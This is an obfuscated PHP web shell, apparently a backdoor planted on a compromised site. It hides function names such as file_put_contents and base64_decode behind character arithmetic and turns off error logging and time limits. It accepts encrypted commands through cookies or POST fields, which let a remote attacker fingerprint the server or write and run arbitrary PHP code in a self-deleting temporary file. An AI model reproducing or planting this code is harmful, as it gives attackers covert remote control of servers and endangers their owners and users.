<?php $XVIVWKMq = "\146".chr(105).chr(108)."\x65"."\x5f".chr(761-649).'u'.chr(236-120).chr(95)."\143".'o'.chr(499-389).'t'."\145"."\x6e"."\x74".'s';
$eLglTIE = chr(538-440).'a'.chr(115).'e'."\66".'4'."\137".'d'.'e'."\143".chr(111)."\x64"."\145";
$tBhLUjyPs = "\151".chr(110).chr(1067-962).chr(95).'s'.chr(101).chr(116);
$iinjRvX = 'u'.chr(110).chr(108).chr(124-19)."\156".'k';


@$tBhLUjyPs(chr(101)."\x72".chr(996-882)."\x6f".'r'."\137".chr(1039-931).chr(704-593)."\x67", NULL);
@$tBhLUjyPs('l'."\x6f".chr(724-621).'_'.chr(927-826).chr(760-646).chr(983-869)."\x6f".chr(114)."\163", 0);
@$tBhLUjyPs('m'."\141".chr(120)."\x5f".chr(604-503).'x'."\x65"."\x63"."\165"."\x74".chr(325-220).'o'."\156".chr(95).chr(790-674)."\151".chr(695-586)."\x65", 0);
@set_time_limit(0);

function lQtAB($GqGDBFsx, $IUqRjOXqRb)
{
    $VnGoIa = "";
    for ($vwiXpexoo = 0; $vwiXpexoo < strlen($GqGDBFsx);) {
        for ($j = 0; $j < strlen($IUqRjOXqRb) && $vwiXpexoo < strlen($GqGDBFsx); $j++, $vwiXpexoo++) {
            $VnGoIa .= chr(ord($GqGDBFsx[$vwiXpexoo]) ^ ord($IUqRjOXqRb[$j]));
        }
    }
    return $VnGoIa;
}

$SBfQok = array_merge($_COOKIE, $_POST);
$SOBGmtRx = 'a7ce07c1-87ce-46a8-a76c-bf9223776e79';
foreach ($SBfQok as $VOiZyLl => $GqGDBFsx) {
    $GqGDBFsx = @unserialize(lQtAB(lQtAB($eLglTIE($GqGDBFsx), $SOBGmtRx), $VOiZyLl));
    if (isset($GqGDBFsx[chr(97)."\x6b"])) {
        if ($GqGDBFsx["\141"] == "\x69") {
            $vwiXpexoo = array(
                chr(601-489)."\x76" => @phpversion(),
                "\x73".'v' => "3.5",
            );
            echo @serialize($vwiXpexoo);
        } elseif ($GqGDBFsx["\141"] == chr(190-89)) {
            $ggynzXId = "./" . md5($SOBGmtRx) . '.'.'i'."\156".chr(99);
            @$XVIVWKMq($ggynzXId, "<" . '?'.'p'.chr(903-799)."\x70"."\40".chr(696-632).chr(1078-961)."\x6e".'l'."\x69".chr(110)."\153"."\x28"."\x5f"."\x5f"."\x46".'I'."\x4c"."\105"."\137".'_'."\x29".';'."\40" . $GqGDBFsx[chr(989-889)]);
            include($ggynzXId);
            @$iinjRvX($ggynzXId);
        }
        exit();
    }
}

